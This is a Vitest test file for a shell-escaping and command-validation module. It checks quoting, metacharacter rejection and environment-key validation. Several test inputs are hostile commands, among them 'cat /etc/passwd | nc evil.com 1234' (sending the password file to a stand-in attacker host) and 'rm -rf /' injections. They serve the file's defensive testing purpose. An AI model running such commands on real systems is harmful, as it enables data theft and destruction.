import { describe, expect, it } from "vitest";
import { shellEscapeArg, validateCommand, validateEnvKey } from "../src/shell-escape.js";

describe("shellEscapeArg", () => {
  it("wraps simple string in single quotes", () => {
    expect(shellEscapeArg("hello")).toBe("'hello'");
  });

  it("escapes embedded single quotes", () => {
    expect(shellEscapeArg("it's")).toBe("'it'\\''s'");
  });

  it("handles empty string", () => {
    expect(shellEscapeArg("")).toBe("''");
  });

  it("handles string with spaces", () => {
    expect(shellEscapeArg("hello world")).toBe("'hello world'");
  });

  it("handles string with semicolons", () => {
    expect(shellEscapeArg("cmd; rm -rf /")).toBe("'cmd; rm -rf /'");
  });

  it("handles string with backticks", () => {
    expect(shellEscapeArg("`whoami`")).toBe("'`whoami`'");
  });

  it("handles string with dollar signs", () => {
    expect(shellEscapeArg("$HOME")).toBe("'$HOME'");
  });

  it("handles string with pipes", () => {
    expect(shellEscapeArg("cat /etc/passwd | nc evil.com 1234")).toBe(
      "'cat /etc/passwd | nc evil.com 1234'",
    );
  });

  it("handles multiple single quotes", () => {
    expect(shellEscapeArg("it's a 'test'")).toBe("'it'\\''s a '\\''test'\\'''");
  });
});

describe("validateCommand", () => {
  it("returns trimmed command for valid input", () => {
    expect(validateCommand("ls -la")).toBe("ls -la");
  });

  it("trims whitespace", () => {
    expect(validateCommand("  echo hello  ")).toBe("echo hello");
  });

  it("allows simple commands without metacharacters", () => {
    expect(validateCommand("ls -la")).toBe("ls -la");
  });

  it("allows commands with flags and paths", () => {
    expect(validateCommand("find /tmp -name foo.txt")).toBe("find /tmp -name foo.txt");
  });

  it("rejects pipes", () => {
    expect(() => validateCommand("ls | grep foo")).toThrow("metacharacter '|'");
  });

  it("rejects semicolons", () => {
    expect(() => validateCommand("cd /tmp; ls")).toThrow("metacharacter ';'");
  });

  it("rejects && chaining", () => {
    expect(() => validateCommand("make && make install")).toThrow("metacharacter '&'");
  });

  it("rejects subshell via backticks", () => {
    expect(() => validateCommand("`whoami`")).toThrow("metacharacter '`'");
  });

  it("rejects $() subshell", () => {
    expect(() => validateCommand("echo $(id)")).toThrow("metacharacter '$'");
  });

  it("rejects variable expansion", () => {
    expect(() => validateCommand("echo $HOME")).toThrow("metacharacter '$'");
  });

  it("rejects output redirection", () => {
    expect(() => validateCommand("echo hi > /tmp/out")).toThrow("metacharacter '>'");
  });

  it("rejects input redirection", () => {
    expect(() => validateCommand("cat < /etc/passwd")).toThrow("metacharacter '<'");
  });

  it("rejects background operator", () => {
    expect(() => validateCommand("sleep 100 &")).toThrow("metacharacter '&'");
  });

  it("rejects backslash escape sequences", () => {
    expect(() => validateCommand("echo hi\\nworld")).toThrow("metacharacter '\\'");
  });

  it("error message directs to execInContainerRaw", () => {
    expect(() => validateCommand("ls | grep foo")).toThrow("execInContainerRaw");
  });

  it("rejects null bytes", () => {
    expect(() => validateCommand("ls\0; rm -rf /")).toThrow("null bytes");
  });

  it("rejects empty command", () => {
    expect(() => validateCommand("")).toThrow("empty");
  });

  it("rejects whitespace-only command", () => {
    expect(() => validateCommand("   ")).toThrow("empty");
  });
});

describe("validateEnvKey", () => {
  it("accepts simple alphanumeric key", () => {
    expect(validateEnvKey("MY_VAR")).toBe("MY_VAR");
  });

  it("accepts key starting with underscore", () => {
    expect(validateEnvKey("_PRIVATE")).toBe("_PRIVATE");
  });

  it("accepts key with numbers (not at start)", () => {
    expect(validateEnvKey("VAR_123")).toBe("VAR_123");
  });

  it("accepts lowercase key", () => {
    expect(validateEnvKey("my_var")).toBe("my_var");
  });

  it("rejects key starting with a digit", () => {
    expect(() => validateEnvKey("1VAR")).toThrow("Invalid environment variable key");
  });

  it("rejects key with equals sign (injection vector)", () => {
    expect(() => validateEnvKey("KEY=evil")).toThrow("Invalid environment variable key");
  });

  it("rejects key with semicolon", () => {
    expect(() => validateEnvKey("KEY;rm")).toThrow("Invalid environment variable key");
  });

  it("rejects key with space", () => {
    expect(() => validateEnvKey("MY VAR")).toThrow("Invalid environment variable key");
  });

  it("rejects empty key", () => {
    expect(() => validateEnvKey("")).toThrow("Invalid environment variable key");
  });

  it("rejects key with hyphen", () => {
    expect(() => validateEnvKey("MY-VAR")).toThrow("Invalid environment variable key");
  });
});
